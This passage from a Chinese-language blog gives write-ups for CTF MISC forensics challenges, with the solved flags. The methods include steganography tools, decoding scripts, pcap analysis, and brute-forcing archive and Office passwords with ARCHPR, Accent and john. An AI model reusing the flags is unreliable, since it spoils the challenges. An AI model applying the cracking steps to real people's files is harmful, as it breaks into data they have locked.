，因此我们知道了，上面的编码为<code>AES编码</code>，密钥为：<code>Tokyo</code>，解密：<code>CCGandGulu</code></p><p>通过该密码，解压压缩包得到：Ending.wav:</p><img src="https://s2.loli.net/2023/01/30/R4sPtToBW2vSGcJ.png" alt="image-20230130203606605" style="zoom:33%;" /><p>经过尝试，这里的 <code>wav</code>文件隐写需要使用工具：<code>silenteye</code></p><img src="https://s2.loli.net/2023/01/30/MAhSqabV891c2TR.png" alt="image-20230130203806487" style="zoom:33%;" /><h2 id="ACTF新生赛2020-music"><a href="#ACTF新生赛2020-music" class="headerlink" title="[ACTF新生赛2020]music"></a>[ACTF新生赛2020]music</h2><p>下载后得到一个 <code>vip.m4a</code> 文件，但是我们打不开，可能文件有问题。</p><p>我们使用 <code>010Editor</code> 打开：</p><img src="https://s2.loli.net/2023/01/30/RA7HZsOCLEjepIw.png" alt="image-20230130211441438" style="zoom:50%;" /><p>存在大量的 <code>A1</code> ，我们将整个文件与 <code>A1</code> 进行<strong>异或</strong>：</p><img src="https://s2.loli.net/2023/01/30/nDXBgaPWZxYTJsy.png" alt="image-20230130211545290" style="zoom:33%;" /><img src="https://s2.loli.net/2023/01/30/ub6o8msdZFJhYIB.png" alt="image-20230130211608343" style="zoom: 50%;" /><p>保存得到正常文件：</p><img src="https://s2.loli.net/2023/01/30/SJh2HjYiFDkZfnI.png" alt="image-20230130211631631" style="zoom:50%;" /><p>打开 m4a文件，播报flag</p><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><blockquote><p>一不小心把存放flag的二维码给撕破了，各位大侠帮忙想想办法吧 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><img src="https://s2.loli.net/2023/01/30/L4TyKD5prGI9gma.jpg" alt="860c6e1a-a433-4a70-bfd0-5a318e758705" style="zoom:25%;" /><p>用ps把这二维码拼起来就行：</p><img src="https://s2.loli.net/2023/01/30/1ySdV7GlhjXoL6e.png" alt="Snipaste_2023-01-30_21-27-58" style="zoom: 25%;" /><h2 id="GKCTF-2021-签到"><a href="#GKCTF-2021-签到" class="headerlink" title="[GKCTF 2021]签到"></a>[GKCTF 2021]签到</h2><p>下载得到流量包，使用<code>wireshark</code> 打开，追踪http协议流量的http流：</p><p><img src="https://s2.loli.net/2023/01/30/ZLeFlu23mX1iKrv.png" alt="image-20230130213651493"></p><p>发现一串可疑的 16进制字符串，我们转文本：</p><p><img src="https://s2.loli.net/2023/01/30/FoQmM9nhijKgGNA.png" alt="image-20230130213724338"></p><p>得到 base64编码，于是我们解码一次：</p><p><img src="https://s2.loli.net/2023/01/30/9SA7FLkpViftPD2.png" alt="image-20230130213800420"></p><p>我们发现这个base64编码有点奇怪，可能是每一行从左到右的顺序反了，我们写个脚本颠倒一下，再解码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;C://Users/LIKE/Desktop/flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>lines = f.readlines()<br>f.close()<br>s = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>    s += line[::-<span class="hljs-number">1</span>].replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-built_in">print</span>(base64.b64decode(s).decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#######################################</span><br><span class="hljs-comment">#         2021-03-30 20:01:08         #</span><br><span class="hljs-comment">#######################################</span><br>--------------------------------------------------<br>窗口:*new <span class="hljs-number">52</span> - Notepad++<br>时间:<span class="hljs-number">2021</span>-03-<span class="hljs-number">30</span> <span class="hljs-number">20</span>:01:<span class="hljs-number">13</span><br>[回车] <br>--------------------------------------------------<br>窗口:*new <span class="hljs-number">52</span> - Notepad++<br>时间:<span class="hljs-number">2021</span>-03-<span class="hljs-number">30</span> <span class="hljs-number">20</span>:01:<span class="hljs-number">13</span><br>[回车] [回车] [回车] ffllaagg&#123;&#123;&#125;&#125;WWeellcc))[删除] [删除] 00mmee__GGkkCC44FF__mm11ssiiCCCCCCCCCCCC!!<br></code></pre></td></tr></table></figure><p>flag{Welc0me_GkC4F_m1siC!}</p><p>或者利用栅栏密码网站，调整一下{}的位置就好了</p><img src="https://s2.loli.net/2023/01/30/VwjNU38WERPLAQc.png" alt="image-20220311183527829" style="zoom: 50%;" /><h2 id="CFI-CTF-2018-webLogon-capture"><a href="#CFI-CTF-2018-webLogon-capture" class="headerlink" title="[CFI-CTF 2018]webLogon capture"></a>[CFI-CTF 2018]webLogon capture</h2><p>使用 <code>wireshark</code> 打开，追踪http流：</p><p><img src="https://s2.loli.net/2023/01/30/xOUdTqD6RyW9GJ2.png" alt="image-20230130215123287"></p><p>url解码：<code>CFI&#123;1ns3cur3_l0g0n&#125; </code></p><h2 id="MRCTF2020-pyFlag"><a href="#MRCTF2020-pyFlag" class="headerlink" title="[MRCTF2020]pyFlag"></a>[MRCTF2020]pyFlag</h2><p>下载后得到三张图片</p><img src="https://s2.loli.net/2023/01/30/J78HsqoKwTnIyk6.png" alt="image-20230130223338782" style="zoom:50%;" /><p>都拖进 <code>010Editor</code> 查看，在文件末尾发现：</p><img src="https://s2.loli.net/2023/01/30/TDUqyFjZN2d8xEY.png" alt="image-20230130223556522" style="zoom: 33%;" /><img src="https://s2.loli.net/2023/01/30/soCmYNjnLFyazSD.png" alt="image-20230130223447086" style="zoom: 50%;" /><img src="https://s2.loli.net/2023/01/30/ekviXcFDaVrdpI7.png" alt="image-20230130223522233" style="zoom:50%;" /><p>将三张图片尾的数据拼接起来，保存为zip文件，但是需要密码，我们使用 <code>ARCHPR</code> 爆破，得到密码</p><img src="https://s2.loli.net/2023/01/30/1aLp8COgD5cQPFZ.png" alt="image-20230130223738824" style="zoom:33%;" /><p>里面有两个文件：</p><p><img src="https://s2.loli.net/2023/01/30/avybgY8eOAwu1HE.png" alt="image-20230130223822942"></p><p><img src="https://s2.loli.net/2023/01/30/TMWiEVIk8uoFQUH.png" alt="image-20230130223830923"></p><p>根据提示，flag.txt 文件使用 base16、base32、base85编码。</p><p>我们可以使用脚本解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> re<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">baseDec</span>(<span class="hljs-params">text, <span class="hljs-built_in">type</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> base64.b16decode(text)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> base64.b32decode(text)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">return</span> base64.b64decode(text)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">return</span> base64.b85decode(text)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">detect</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&quot;^[0-9A-F=]+$&quot;</span>, text.decode()) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&quot;^[A-Z2-7=]+$&quot;</span>, text.decode()) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">2</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&quot;^[A-Za-z0-9+/=]+$&quot;</span>, text.decode()) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">3</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">autoDec</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;&#123;&quot;</span> <span class="hljs-keyword">in</span> text:<br>            <span class="hljs-built_in">print</span>(text.decode())<br>            <span class="hljs-keyword">break</span><br><br>        code = detect(text)<br>        text = baseDec(text, code)<br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/flag.txt&quot;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    flag = f.read()<br><br>autoDec(flag)<br></code></pre></td></tr></table></figure><p>解密得到flag</p><h2 id="MRCTF2020-不眠之夜"><a href="#MRCTF2020-不眠之夜" class="headerlink" title="[MRCTF2020]不眠之夜"></a>[MRCTF2020]不眠之夜</h2><p>下载后得到一大堆图片，总共120个</p><p>这就是一个拼图题，我们首先使用 <code>montage</code> 将所有小图拼在一起。</p><p>先查看图片属性：</p><img src="https://s2.loli.net/2023/01/30/31aJP5B6RmsLjVt.png" alt="image-20230130225207185" style="zoom:33%;" /><p>发现每一张图片都是 <code>200x100</code> 分辨率，于是我们猜测，整张图片为 <code>2000x1200</code>分辨率</p><p>即：长10张、宽12张。 于是我们使用 <code>montage</code> 将图片拼在一起</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">montage *jpg -tile 10x12 -geometry +0+0 flag.jpg <br><span class="hljs-meta prompt_"># </span><span class="language-bash">注意是tile不是title，代表长10张、宽12张</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-geometry +0+0 代表每一张图片间没有间隙</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/30/jB3eclPEpkRJHAi.png" alt="image-20230130225559017"></p><p>然后我们使用 <code>gaps</code> 命令，将图片拼成正确顺序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">gaps --image flag.jpg --size 200<br>gaps --image=flag.jpg --generations=40 --population=120 --size=100<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/30/k6JtFy87h92UlBo.png" alt="image-20230130230117028"></p><h2 id="GKCTF-2021-excel-骚操作"><a href="#GKCTF-2021-excel-骚操作" class="headerlink" title="[GKCTF 2021]excel 骚操作"></a>[GKCTF 2021]excel 骚操作</h2><p>下载后得到一个 excel文件</p><p><img src="https://s2.loli.net/2023/01/31/oUMEdWI3Tfhbkc1.png" alt="image-20230131210012550"></p><p>发现鼠标点击某些格子时会显示数值1：</p><img src="https://s2.loli.net/2023/01/31/lD2r1pXVhjCY5m9.png" alt="image-20230131210047970" style="zoom:33%;" /><p>于是我们 <code>ctrl+h</code> 将 1 替换为黑色：</p><p><img src="https://s2.loli.net/2023/01/31/jHop8C6LTKvVNaY.png" alt="image-20230131210154721"></p><p>但是有点宽了，我们改一下格子宽度：</p><img src="https://s2.loli.net/2023/01/31/puKCiO5mGWNqvHE.png" alt="image-20230131210230004" style="zoom:33%;" /><p>如下：</p><img src="https://s2.loli.net/2023/01/31/6VldobnqFwhOiWB.png" alt="image-20230131210254117" style="zoom:33%;" /><p>但是这个二维码有点奇怪，扫不出来，查资料发现是<code>汉信码</code>。</p><p>打开中国编码网下载对应app，扫码得到flag：</p><img src="https://s2.loli.net/2023/01/31/XL5eGClpVa8WEri.jpg" alt="在这里插入图片描述" style="zoom: 25%;" /><h2 id="UTCTF2020-File-Carving"><a href="#UTCTF2020-File-Carving" class="headerlink" title="[UTCTF2020]File Carving"></a>[UTCTF2020]File Carving</h2><p>下载后得到一张图片，我们使用 <code>foremost</code> 分离一下：</p><img src="https://s2.loli.net/2023/01/31/evNZm2bViAcQ78h.png" alt="image-20230131213015334" style="zoom: 33%;" /><p>在zip中发现一个文件： <code>hidden_binaryUT</code>，我们用 file 命令查看文件类型：</p><p><img src="https://s2.loli.net/2023/01/31/Xf9dZDOhb5npWmK.png" alt="image-20230131213206307"></p><p>发现是 <code>ELF</code> 类型文件</p><p>查资料得知，ELF存在可执行文件的这一类型，于是我们可以执行该文件，</p><p>但是我们首先应该修改权限：</p><img src="https://s2.loli.net/2023/01/31/vNpOgYetG8f56hJ.png" alt="image-20230131213426704" style="zoom:33%;" /><p>执行：</p><img src="https://s2.loli.net/2023/01/31/NbQPyM4egF3CIoc.png" alt="image-20230131213608834" style="zoom: 25%;" /><p>得到flag</p><h2 id="watevrCTF-2019-Evil-Cuteness"><a href="#watevrCTF-2019-Evil-Cuteness" class="headerlink" title="[watevrCTF 2019]Evil Cuteness"></a>[watevrCTF 2019]Evil Cuteness</h2><p><code>foremost</code>分离文件，文件中有flag</p><h2 id="QCTF2018-X-man-A-face"><a href="#QCTF2018-X-man-A-face" class="headerlink" title="[QCTF2018]X-man-A face"></a>[QCTF2018]X-man-A face</h2><p>下载后得到一张图片，里面是残缺的二维码：</p><img src="https://s2.loli.net/2023/01/31/WbefKDLdQjAU8Pu.png" alt="Xman-Aface-61df10385eaccbb3627ca3926c6ae174" style="zoom:33%;" /><p>我们使用 <code>ps</code> 补齐一下：</p><img src="https://s2.loli.net/2023/01/31/ONQj6fZI2DsvTW4.png" alt="Snipaste_2023-01-31_21-24-25" style="zoom:25%;" /><p>扫码：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">KFBVIRT<span class="hljs-number">3</span>KBZGK<span class="hljs-number">5</span>DUPFPV<span class="hljs-name">G2</span>LTORSXEX<span class="hljs-number">2</span>X<span class="hljs-symbol">NBXV6</span>QTVPFZV<span class="hljs-number">6</span>TLFL<span class="hljs-number">5</span>G<span class="hljs-name">G6</span>YTTORSXE<span class="hljs-number">7</span>I=<br></code></pre></td></tr></table></figure><p>这是 <code>base32 编码</code>，解码得到flag</p><h2 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h2><p>下载得到：</p><img src="https://s2.loli.net/2023/01/31/UJ6yoFQNrm3h9HL.png" alt="image-20230131192614001" style="zoom:33%;" /><p>我们使用 <code>binwalk</code> 分离：</p><p><img src="https://s2.loli.net/2023/01/31/ZGqkEK1CNDJgImT.png" alt="image-20230131192826437"></p><p>提示这是 <code>xml</code>文件，我们可以把后缀改为 <code>ppt</code> 打开：</p><img src="https://s2.loli.net/2023/01/31/3YNudO2n4yWKkSB.png" alt="image-20230131192931708" style="zoom:50%;" /><p>提示需要密码，于是我们可以使用工具：<code>Accent OFFICE Password Recovery </code>破解office密码</p><img src="https://s2.loli.net/2023/01/31/F1eTQ6UCIdBgiS4.png" alt="image-20230131193101687" style="zoom:33%;" /><p>我们使用暴力破解</p> <img src="https://s2.loli.net/2023/01/31/ZU1VmeaNOLoipx3.png" alt="image-20230131193132650" style="zoom:33%;" /><p>我们使用纯数字：</p><img src="https://s2.loli.net/2023/01/31/mMIrXRqKOl4yvV2.png" alt="image-20230131193215641" style="zoom:33%;" /><p>获得密码：<code>9919</code></p><img src="https://s2.loli.net/2023/01/31/bSQhM5eGCPJK2i1.png" alt="image-20230131193238691" style="zoom:33%;" /><p>我们打开ppt：</p><p><img src="https://s2.loli.net/2023/01/31/Bh8gsSu45jiMxm3.png" alt="image-20230131193317206"></p><p>第七页发现flag</p><p>解法二：</p><p><code>office2john</code>+<code>john</code></p><h2 id="INSHack2017-sanity"><a href="#INSHack2017-sanity" class="headerlink" title="[INSHack2017]sanity"></a>[INSHack2017]sanity</h2><img src="https://s2.loli.net/2023/01/31/TReWBYVEUx65Z4D.png" alt="image-20230131204244039" style="zoom:33%;" /><h2 id="SCTF2019-电单车"><a href="#SCTF2019-电单车" class="headerlink" title="[SCTF2019]电单车"></a>[SCTF2019]电单车</h2><h2 id="DDCTF2018-流量分析"><a href="#DDCTF2018-流量分析" class="headerlink" title="[DDCTF2018]流量分析"></a>[DDCTF2018]流量分析</h2><h2 id="UTCTF2020-sstv"><a href="#UTCTF2020-sstv" class="headerlink" title="[UTCTF2020]sstv"></a>[UTCTF2020]sstv</h2><p><img src="https://s2.loli.net/2023/01/31/UrohuAHWbdwEQl8.png" alt="img"></p><p>下载后得到一个<code>wav音频文件</code>，听了一下，有点像外星电波那种，嘀嘀嘀。</p><p>结合题目名称，我们知道需要使用工具：<code>RXSSTV</code></p><p>但是使用这个工具之前，我们电脑需要安装:<code>虚拟声卡</code>，这样能够让我们的音频能够被<code>RXSSTV</code>收听。</p><p>使用：</p><p>我们先将电脑音频切换到虚拟声卡：</p><img src="https://s2.loli.net/2023/01/31/rsoPEQyUFaCWtNn.png" alt="image-20230131101517672" style="zoom:33%;" /><p>接着播放音频，播放音频之后我们点击 <code>RXSSTV</code> 的 <code>Receving</code>，这样就能通过音频生成图片了：</p><img src="https://s2.loli.net/2023/01/31/zU2OvJ1EkYNMyn7.png" alt="image-20230131101738753" style="zoom: 33%;" /><p>或者我们可以使用 kali中的 <code>qsstv</code>：</p><img src="https://s2.loli.net/2023/01/31/6MqUA7YXt8oDBLa.png" alt="image-20230131102307494" style="zoom: 50%;" /><h2 id="voip"><a href="#voip" class="headerlink" title="voip"></a>voip</h2><p><img src="https://s2.loli.net/2023/01/31/BFaNrP87QwlSOXe.png" alt="image-20230131103002361"></p><p>VoIP使用RTP协议对语音数据进行传输，语音载荷都封装在RTP包里面。</p><p>我们使用<code>wireshark</code> 打开pcap文件，有两种方法可以听到语音。</p><p>法一：</p><p>点击进入 <code>RTP</code> 流</p><p><img src="https://s2.loli.net/2023/01/31/7vgodMaRGjXFf38.png" alt="image-20230131103412465"></p><p>点击分析</p><p><img src="https://s2.loli.net/2023/01/31/AFrHu1xajId6Mql.png" alt="image-20230131103444584"></p><p>点击<code>播放流</code>：</p><img src="https://s2.loli.net/2023/01/31/kh79fDOe4qm8Jzc.png" alt="image-20230131103548074" style="zoom:33%;" /><p>点击播放就可以听到录音，听到flag</p><p><img src="https://s2.loli.net/2023/01/31/AVYkmufcTyteEKZ.png" alt="image-20230131103734075"></p><p>法二：</p><p>点击voip通话：</p><p><img src="https://s2.loli.net/2023/01/31/34oQ8AVIN2jTUbS.png" alt="image-20230131103715817"></p><p>点击 <code>播放流</code>：</p><p><img src="https://s2.loli.net/2023/01/31/MCFJqxITLDVskmt.png" alt="image-20230131103835993"></p><h2 id="key不在这里"><a href="#key不在这里" class="headerlink" title="key不在这里"></a>key不在这里</h2><p>一张二维码，我们扫码：</p><p><img src="https://s2.loli.net/2023/01/31/nfTim56NQUSw3kO.png" alt="image-20230131104048202"></p><p>得到一串网址，但是我们进入后并没有什么，只是 <code>bing</code> 搜索引擎的参数而已</p><p>我们仔细观察网址，发现一串数字：（长度为92）</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568<br></code></pre></td></tr></table></figure><p>这一串数字看起来像 <code>ascii码</code>，于是我们写一个脚本进行解码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><br>fr = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;C:/Users/LIKE/Desktop/a.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>strs = fr.read()<br>s = <span class="hljs-string">&quot;&quot;</span><br>count = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> count &lt; <span class="hljs-built_in">len</span>(strs):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(strs[count:count+<span class="hljs-number">3</span>]) &lt; <span class="hljs-number">128</span>:<br>        s += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(strs[count:count+<span class="hljs-number">3</span>]))<br>        count += <span class="hljs-number">3</span><br>    <span class="hljs-keyword">else</span>:<br>        s += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(strs[count:count+<span class="hljs-number">2</span>]))<br>        count += <span class="hljs-number">2</span><br><br><span class="hljs-built_in">print</span>(urllib.parse.unquote(s)) <span class="hljs-comment"># flag&#123;5d45fa256372224f48746c6fb8e33b32&#125;</span><br></code></pre></td></tr></table></figure><h2 id="GUET-CTF2019-soul-sipse"><a href="#GUET-CTF2019-soul-sipse" class="headerlink" title="[GUET-CTF2019]soul sipse"></a>[GUET-CTF2019]soul sipse</h2><p>下载后得到：<code>out.wav</code>，经过尝试，我们可以使用 <code>steghide</code> 分离数据，无密码：</p><img src="https://s2.loli.net/2023/01/31/sbum3EnxyJKGAgD.png" alt="image-20230131105337554" style="zoom:50%;" /><p>download.txt:</p><p><code>https://share.weiyun.com/5wVTIN3</code></p><p>下载后得到一张图片：</p><p><img src="https://s2.loli.net/2023/01/31/KwXCvrUext2y7AE.png" alt="image-20230131105431396"></p><p>发现文件头错误，改成 <code>47</code> ：</p><p><img src="https://s2.loli.net/2023/01/31/fuOMLnAtz35d4Px.png" alt="image-20230131105452080"></p><p>获得一串<code>unicode</code>编码 ，我们解码一下：</p><p><img src="https://s2.loli.net/2023/01/31/BIEzrmHwhQYpNsM.png" alt="image-20230131105523236"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">4070</span><br><span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p>flag{5304}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MISC(第4页wp)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISC(第3页wp)</title>
    <link href="/2023/08/24/MISC(%E7%AC%AC3%E9%A1%B5wp)/"/>
    <url>/2023/08/24/MISC(%E7%AC%AC3%E9%A1%B5wp)/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="SUCTF2018-single-dog"><a href="#SUCTF2018-single-dog" class="headerlink" title="[SUCTF2018]single dog"></a>[SUCTF2018]single dog</h2><p>我们使用<code>foremost</code>分离jpg图片</p><img src="https://s2.loli.net/2023/01/29/4pye7Ha9sRUoP3L.png" alt="image-20230129103003958" style="zoom:33%;" /><p>打开txt文件：</p><p><img src="https://s2.loli.net/2023/01/29/iJjDoBt7nhcO4Xk.png" alt="image-20230129103110636"></p><p>发现是js颜文字加密（<code>AAEncode</code>） ，使用   <a href="http://www.atoolbox.net/Tool.php?Id=703">AAEncode解密</a></p><p><img src="https://s2.loli.net/2023/01/29/1bsAPcFRYyUWJBu.png" alt="image-20230129104030772"></p><h2 id="我吃三明治"><a href="#我吃三明治" class="headerlink" title="我吃三明治"></a>我吃三明治</h2><p>我们在图片中发现了一串类似base32加密的串：</p><p><img src="https://s2.loli.net/2023/01/29/yxczdZtf3l6GvkD.png" alt="image-20230129104715887"></p><p>使用base32网站解密</p><p><img src="https://s2.loli.net/2023/01/29/HpNRE237dyMKjoY.png" alt="image-20230129104540410"></p><h2 id="sqltest"><a href="#sqltest" class="headerlink" title="sqltest"></a>sqltest</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>我们使用 <code>wireshark</code> 打开 <code>pcapng</code> 文件，然后导出http对象：</p><img src="https://s2.loli.net/2023/01/29/W4Kr3c6sYpgvbGM.png" alt="image-20230129105328438" style="zoom:33%;" /><p>我们发现有很多 sql注入的测试，我们可以通过这些sql注入来判断flag</p><p><img src="https://s2.loli.net/2023/01/29/CSUWw6JXykMqrDb.png" alt="image-20230129105400454"></p><p>我们一个一个判断，得出flag的ascii值：</p><p><img src="https://s2.loli.net/2023/01/29/gYeHybsL3ujhQVW.png" alt="image-20230129105926330"></p><p><code>102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50  56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125</code></p><p>我们将其转化为字符：</p><p><img src="https://s2.loli.net/2023/01/29/Oo8LIjX6UsuCQEG.png" alt="image-20230129110200781"></p><h2 id="SWPU2019-你有没有好好看网课"><a href="#SWPU2019-你有没有好好看网课" class="headerlink" title="[SWPU2019]你有没有好好看网课?"></a>[SWPU2019]你有没有好好看网课?</h2><p><img src="https://s2.loli.net/2023/01/29/Bv3cCr2JMqOyziZ.png" alt="image-20230129110358654"></p><p>我们使用 <code>ARCHPR</code> 爆破密码：</p><img src="https://s2.loli.net/2023/01/29/ITQdGHvURAbfjCs.png" alt="image-20230129110446883" style="zoom:33%;" /><p>打开文件夹：</p><img src="https://s2.loli.net/2023/01/29/J2Ly9PKbxE36slC.png" alt="image-20230129111232307" style="zoom:33%;" /><p>我们打开 word文档：</p><img src="https://s2.loli.net/2023/01/29/ayYFBrxgfs1tpZO.png" alt="image-20230129111309981" style="zoom: 33%;" /><p><code>5.20 7.11</code>这个猜测是视频的秒数，我们使用 <code>Kinovea</code> 打开视频（可以一帧一帧的看视频）：</p><p>在 5.66秒处发现提示</p><p><img src="https://s2.loli.net/2023/01/29/EXapkQ3VoixnJLO.png" alt="在这里插入图片描述"></p><p><strong>敲击码</strong>：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.....</span> <span class="hljs-string">../...</span> <span class="hljs-string">./...</span> <span class="hljs-string">./...</span> <span class="hljs-string">../</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/29/fLzHXeiIu91UkJc.png" alt="image-20230129111924224"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">..... ..<span class="hljs-regexp">/... ./</span>... .<span class="hljs-regexp">/... ../</span>通过斜杠分为不同的组<br> <span class="hljs-number">5</span>  <span class="hljs-number">2</span> <span class="hljs-regexp">/ 3 1 /</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span><span class="hljs-regexp">/ 3 2/</span><br>  W      L    L    M<br></code></pre></td></tr></table></figure><p>在 7.36 秒 发现第二段信息：</p><p><img src="https://s2.loli.net/2023/01/29/EVfvZzF74TKWDIj.png" alt="在这里插入图片描述"></p><p>base64解密，我们可以使用 <code>php -r</code> 在命令行执行php代码</p><p><img src="https://s2.loli.net/2023/01/29/hswVknj4FlmUaC7.png" alt="image-20230129112446845"></p><p>两段密码拼接一下得到 flag1 压缩包密码。</p><p><code>010Editor</code> 打开图片得到flag</p><p><img 